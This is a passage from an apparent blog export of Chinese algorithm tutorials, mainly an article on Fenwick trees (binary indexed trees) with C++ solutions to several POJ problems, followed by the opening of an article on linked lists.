class="params">(<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        sum+=(<span class="keyword">int</span>)(l[i]/x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum&gt;=k) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;l[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> lb=<span class="number">0</span>,ub=Inf;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">double</span> mid=(lb+ub)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(check(mid)) lb=mid;</span><br><span class="line">        <span class="keyword">else</span> ub=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>,<span class="built_in">floor</span>(ub*<span class="number">100</span>)/<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>树状数组</title>
    <url>/algorithm/fenwick-tree/</url>
    <content><![CDATA[<p>给定一个初始值全为$0$的数列$a_1,a_2,..,a_n$</p>
<ul>
<li>给定$i$,计算$a_1+a_2+…+a_n$</li>
<li>给定$i$和$x$，计算$a_i+=x$</li>
</ul>
<p>树状数组可以在$O(logn)$时间内计算区间前缀和，在$O(logn)$时间内更新单点的值。</p>
<a id="more"></a>

<p>树状数组的关系图为</p>
<p><img src="https://i.loli.net/2020/03/20/lQBDIEcHbmWTVxv.png"></p>
<h1 id="lowbit操作"><a href="#lowbit操作" class="headerlink" title="lowbit操作"></a>lowbit操作</h1><p><code>lowbit</code>操作返回$x$在二进制表示下为1的最低位对应的幂，例如$lowbit((101000)_2)$为$(1000)_2$。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>lowbit</code>求解原理为：将$x$按位取反再加一后与之前的$x$相与</p>
<p>例如$(101000)_2$</p>
<ol>
<li>按位取反得到$(010111)_2$</li>
<li>+1,得到$(011000)_2$</li>
<li>$011000 &amp;101000$，得到$ (1000)_2$</li>
</ol>
<p>树状数组中的元素满足$t[x]=\sum_{i=x-lowbit(x)+1}^{x}a[i]$,即其中第$x$位元素的值为$x$与$lowbit(x)$之间元素的和，<code>lowbit(x)</code>等于当前位置所覆盖的区间长度。</p>
<h1 id="单点修改和区间查询"><a href="#单点修改和区间查询" class="headerlink" title="单点修改和区间查询"></a>单点修改和区间查询</h1><p>树状数组中求前缀和和更新值的操作如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> t[maxn],n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        res+=t[i];</span><br><span class="line">        i-=lowbit(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        t[i]+=x;</span><br><span class="line">        i+=lowbit(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="单点修改"><a href="#单点修改" class="headerlink" title="单点修改"></a>单点修改</h2><p>每个节点的父亲都可以表示为$x+lowbit(x)$，在更新$a[x]$的时候，逐步更新其祖先节点的值。</p>
<h2 id="区间查询"><a href="#区间查询" class="headerlink" title="区间查询"></a>区间查询</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sum(r)-sum(l<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查询某个区间的区间和通过前缀和相减来实现，例如，求$[l,r]$的区间和，只需求$\sum_{i=1}^{r}a[i]-\sum_{i=1}^{l-1}a[i]$ 。根据<code>lowbit(x)</code>的性质，可以将$[1,x]$分解为一个个不相交的子区间，将各个子区间的和相加即是$[1,x]$的前缀和。</p>
<p>例如<a href="http://poj.org/problem?id=1990">POJ 1990</a></p>
<p>给定$n$头牛的坐标，每头牛听力为$v_i$，两头牛($i$和$j$)之间必须以$max(v_i,v_j)$的音量沟通，沟通过程中消耗能量为$max(v_i,v_j)|x_i-x_j|$,求这$n$头牛两两沟通总共消耗多少能量。</p>
<p>任意两头牛之间以$max(v_i,v_j)$沟通，可以按照听力排序，从小到大处理$n$头牛。</p>
<p>对于正在处理的牛$i$，与其沟通所消耗的能量应该是其听力与所有听力小于该牛的坐标值之和的乘积。</p>
<p>维护两个树状数组，其中$bit0$用于计数，$bit1$用于计算坐标和。</p>
<p>维护处理过的所有牛的坐标和$tot$，并执行$add(bit0,x,1)$和$add(bit1,x,x)$。</p>
<p>对于牛$i$来说，</p>
<p>左边牛的坐标差值和为$sum(bit0,x[i])*x[i]-sum(bit1,x[i])$</p>
<p>右边牛的坐标差值和为$ tot-sum(bit1,x)-x[i] (i+1-sum(bit0,x[i]))$</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">20005</span>;</span><br><span class="line">ll bit0[maxn],bit1[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v,x;</span><br><span class="line">&#125;;</span><br><span class="line">Node a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Node a,Node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.v&lt;b.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">sum</span><span class="params">(ll *b,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    ll s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        s+=b[i];</span><br><span class="line">        i-=i&amp;(-i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(ll *b,<span class="keyword">int</span> i,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;maxn)&#123;</span><br><span class="line">        b[i]+=v;</span><br><span class="line">        i+=i&amp;(-i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a[i].v,&amp;a[i].x);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,a+n,cmp);</span><br><span class="line">    ll tot=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(bit0,<span class="number">0</span>,<span class="keyword">sizeof</span>(bit0));</span><br><span class="line">    <span class="built_in">memset</span>(bit1,<span class="number">0</span>,<span class="keyword">sizeof</span>(bit1));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x=a[i].x;</span><br><span class="line">        tot+=x;</span><br><span class="line">        add(bit0,x,<span class="number">1</span>);</span><br><span class="line">        add(bit1,x,x);</span><br><span class="line">        ll s1=sum(bit0,x);</span><br><span class="line">        ll s2=sum(bit1,x);</span><br><span class="line">        ll temp1=s1*x-s2;</span><br><span class="line">        ll temp2=tot-s2-x*(i+<span class="number">1</span>-s1);</span><br><span class="line">        ans+=(temp1+temp2)*a[i].v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://poj.org/problem?id=3109">POJ 3109</a></p>
<p>先离散化所有黑棋的纵坐标，扫描线按照横坐标从左到右依次扫描，通过树状数组动态求和。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100005</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">&#125;;</span><br><span class="line">Node a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Node a,Node b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.x==b.x) <span class="keyword">return</span> a.y&lt;a.y;</span><br><span class="line">    <span class="keyword">return</span> a.x&lt;b.x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> bit[maxn];</span><br><span class="line"><span class="keyword">int</span> l[maxn],r[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i)</span><br><span class="line">	&#123;</span><br><span class="line">		res+=bit[i];</span><br><span class="line">		i-=lowbit(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;maxn)</span><br><span class="line">	&#123;</span><br><span class="line">		bit[i]+= x;</span><br><span class="line">		i+=lowbit(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; h;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a[i].x,&amp;a[i].y);</span><br><span class="line">        h.push_back(a[i].y);</span><br><span class="line">    &#125;</span><br><span class="line">	sort(a,a+n,cmp);</span><br><span class="line">	sort(h.begin(),h.end());</span><br><span class="line">	h.erase(unique(h.begin(), h.end()), h.end());</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        a[i].y=lower_bound(h.begin(),h.end(),a[i].y)-h.begin()+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(l,inf,<span class="keyword">sizeof</span>(l));</span><br><span class="line">	<span class="built_in">memset</span>(r,-inf,<span class="keyword">sizeof</span>(r));</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l[a[i].y]==inf) l[a[i].y]=a[i].x;</span><br><span class="line">        r[a[i].y]=a[i].x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">	ll ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>  i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;n)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x = a[i].x, L = inf, R = -inf;</span><br><span class="line">		<span class="keyword">int</span> j = i;</span><br><span class="line">		<span class="keyword">while</span>(i&lt;n&amp;&amp;a[i].x == x)</span><br><span class="line">		&#123;</span><br><span class="line">			L=min(L, a[i].y);</span><br><span class="line">			R=max(R, a[i].y);</span><br><span class="line">			<span class="keyword">if</span>(x==l[a[i].y])</span><br><span class="line">			add(a[i].y, <span class="number">1</span>);</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		ans+=sum(R)-sum(L - <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">while</span>(j&lt;i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(x==r[a[j].y])</span><br><span class="line">			add(a[j].y, <span class="number">-1</span>);</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="区间修改和单点查询"><a href="#区间修改和单点查询" class="headerlink" title="区间修改和单点查询"></a>区间修改和单点查询</h1><p>为了便于执行单点查询操作，引入差分数组的概念，差分数组中$p[i]=a[i]-a[i-1]$。</p>
<p>$\sum_{i=1}^{x}=a[1]+(a[2]-a[1])+(a[3]-a[2])+(a[4]-a[3])+…(a[x-1]+a[x-2])+(a[x]-a[x-1])$</p>
<p>显然，差分数组的前缀和即是单点查询所返回的值。</p>
<p>这样一来，树状数组在$O(logn)$时间内求前缀和的性质可以应用于求差分数组得前缀和，从而在$O(logn)$时间内执行单点查询操作。</p>
<p>若想对区间$[l,r]$中所有元素同时加上$x$，同样通过差分思想来操作。差分数组维护相邻两项的差值，所以仅仅区间首尾两项会更新，其余部分的差值不变。更新时，对$p[l]+x$,$p[r+1]-x$，通过两次单点更新操作实现区间修改。</p>
<p>例如<a href="http://poj.org/problem?id=2155">POJ 2155</a> </p>
<p>二维树状数组的区间修改和单点查询问题，思想与一维类似，更新点由两个变为四个。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> bit[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">sum</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    ll s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x;i&gt;<span class="number">0</span>;i-=lowbit(i))&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=y;j&gt;<span class="number">0</span>;j-=lowbit(j))&#123;</span><br><span class="line">            s+=bit[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x;i&lt;maxn;i+=lowbit(i))&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=y;j&lt;maxn;j+=lowbit(j))&#123;</span><br><span class="line">            bit[i][j]+=val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n,m;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">        <span class="built_in">memset</span>(bit,<span class="number">0</span>,<span class="keyword">sizeof</span>(bit));</span><br><span class="line">        <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">            <span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">            <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> x1,y1,x2,y2;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;x1,&amp;y1,&amp;x2,&amp;y2);</span><br><span class="line">                add(x1,y1,<span class="number">1</span>);</span><br><span class="line">                add(x2+<span class="number">1</span>,y1,<span class="number">-1</span>);</span><br><span class="line">                add(x1,y2+<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">                add(x2+<span class="number">1</span>,y2+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> x,y;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">                ll ans=sum(x,y);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans&amp;<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="区间修改和区间查询"><a href="#区间修改和区间查询" class="headerlink" title="区间修改和区间查询"></a>区间修改和区间查询</h1><p>区间修改和区间查询同样应用了差分思想，考虑前缀和$sum(x)=\sum_{i=1}^{x}a[i]=\sum_{i=1}^{x}\sum_{j=1}^{i}p[j]$ </p>
<p>同时给区间$[l,r]$同时加上$x$时，树状数组中的值将会如何变化呢？</p>
<ol>
<li>$i&lt;l$,$sum’(i)=sum(i)$</li>
<li>$l\leq i \leq r$ ，$sum’(i)=sum(i)+x(i-l+1)=sum(i)+xi-x(l-1)$</li>
<li>$r&lt;i$,$sum’(i)=sum(i)+x(r-l+1)$</li>
</ol>
<p>构建两个树状数组$bit0$和$bit1$，$sum(bit,i)$为树状数组的前$i$项和</p>
<p>$\sum_{j=1}^{i}=sum(bit1,i)i+sum(bit0,i)$</p>
<p>那么在$[l,r]$区间同时加上$x$就等效于</p>
<ul>
<li>在$bit0$的$l$位置上加上$-x(l-1)$</li>
<li>在$bit1$的l位置上加上$x$</li>
<li>在$bit0$的位置上加上$xr$</li>
<li>在$bit1$的位置上加上$-x$</li>
</ul>
<p>因此，区间查询和区间更新操作均可在$O(logn)$时间内完成。</p>
<p>例如<a href="http://poj.org/problem?id=3468">POJ 3468</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">int</span> l,r,x;</span><br><span class="line">ll bit0[maxn],bit1[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">sum</span><span class="params">(ll *b,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    ll s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        s+=b[i];</span><br><span class="line">        i-=i&amp;-i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(ll *b,<span class="keyword">int</span> i,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        b[i]+=v;</span><br><span class="line">        i+=i&amp;-i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;q)==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">            add(bit0,i,a[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;q;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,c);</span><br><span class="line">            <span class="keyword">if</span>(c[<span class="number">0</span>]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;l,&amp;r,&amp;x);</span><br><span class="line">                add(bit0,l,-x*(l<span class="number">-1</span>));</span><br><span class="line">                add(bit1,l,x);</span><br><span class="line">                add(bit0,r+<span class="number">1</span>,x*r);</span><br><span class="line">                add(bit1,r+<span class="number">1</span>,-x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">                ll res=<span class="number">0</span>;</span><br><span class="line">                res+=sum(bit0,r)+sum(bit1,r)*r;</span><br><span class="line">                res-=sum(bit0,l<span class="number">-1</span>)+sum(bit1,l<span class="number">-1</span>)*(l<span class="number">-1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>列表</title>
    <url>/algorithm/list/</url>
    <content><![CDATA[<p>根据是否修改数据结构，所有操作分为两类方式</p>
<ul>
<li>静态：仅读取，数据结构的内容和组成不变</li>
<li>动态：需写入，数据结构的局部或整体将改变</li>
</ul>
<p>与操作方式相对应的，数据元素的存储和组织形式也分为两种</p>
<ul>
<li>静态：数据空间整体创建和销毁</li>
<li>动态：为各个数据元素动态地分配和回收的物理空间，相邻元素记录彼此的物理地址，在逻辑上形成一个整体，可支持高效的动态操作。</li>
</ul>
<p>列表是采用动态存储的典型结构，循位置访问，通过节点之间的相互引用找到特定的节点。借助列表设计算法时，应更多地借助逻辑上相邻元素之间的位置索引。</p>
<a id="more"></a>

<h1 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h1><h2 id="循秩访问"><a href="#循秩访问" class="headerlink" title="循秩访问"></a>循秩访问</h2><p>模仿向量的循秩访问方式，重载下标操作符，时间复杂度$O(r)$，线性正比于待访问的秩</p>
<p>以均匀分布为例，单次访问的期望复杂度为$\displaystyle\frac {1+2+3+4+…+n} n = (n+1)/2= o(n)$</p>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><p>在节点p(可能为尾节点)的n个真前驱中找到等于e的最后者</p>
